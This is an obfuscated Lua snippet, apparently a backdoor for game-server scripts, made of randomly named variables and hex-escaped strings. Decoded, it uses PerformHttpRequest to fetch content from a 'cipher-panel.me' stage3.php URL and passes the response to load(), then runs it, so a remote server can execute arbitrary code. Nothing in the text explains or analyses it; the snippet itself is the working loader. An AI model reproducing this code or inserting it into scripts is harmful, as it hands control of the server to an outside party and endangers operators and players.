local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)